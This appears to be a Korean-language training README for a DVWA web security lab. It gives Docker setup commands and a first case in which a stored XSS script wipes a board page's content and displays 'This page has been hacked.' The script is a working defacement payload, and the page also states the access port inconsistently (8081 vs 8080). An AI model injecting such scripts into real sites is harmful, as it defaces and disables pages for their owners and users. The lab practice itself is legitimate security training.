# 🧪 Training

## 🧱 DVWA (Damn Vulnerable Web Application)

- 트레이닝 환경은 DVWA 환경을 구축하여 진행했습니다.
- **DVWA**는 웹 애플리케이션의 취약점(예: HTML Injection, SQL Injection, XSS 등)을 실습할 수 있도록 설계된 **취약한 웹 애플리케이션 플랫폼**입니다.
- 보안 교육, 모의 해킹 실습, 취약점 분석 훈련 등에 널리 활용됩니다.

---

## 🐳 DVWA Docker 환경 구축

아래 명령어를 사용하여 **Docker**로 DVWA를 손쉽게 실행할 수 있습니다.
```
# 버프수트에서 8080 포트를 사용하고 있어서 8081로 설정함.
# 8080 포트 사용 시 인터셉트가 걸리지 않을 수 있음.
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa 

# 종료
docker stop dvwa
```
- `-d`: 백그라운드 모드로 실행  
- `-p 8081:80`: 호스트의 포트 8081을 컨테이너의 포트 80에 매핑  
- `--name dvwa`: 컨테이너 이름을 `dvwa`로 지정  
- `vulnerables/web-dvwa`: DVWA 공식 Docker 이미지

> ✅ 실행 후 브라우저에서 `http://localhost:8080` 접속

---

<img width="1917" height="943" alt="image" src="https://github.com/user-attachments/assets/204c9320-f501-41ee-ab1b-eeaf48642727" />

## 본격 트레이닝

### CASE 1.

#### 게시판 목록 화면에서 스크립트 삽입을 통해 HTML 조작하여 게시판 마비

##### 삽입 스크립트

```
<script>
  document.getElementById('main_body').innerHTML = '';
  var h1Tag = document.createElement('h1');
  h1Tag.innerText = '이 페이지는 해킹 당했습니다.';
  document.getElementById('main_body').append(h1Tag);
</script>
```

<img width="892" height="859" alt="image" src="https://github.com/user-attachments/assets/76036b7d-69d7-4be8-ab17-f971eb6bf7ec" />

##### 등록

<img width="894" height="860" alt="image" src="https://github.com/user-attachments/assets/3602f5c8-42cc-481a-b1a7-7bfaf288a159" />
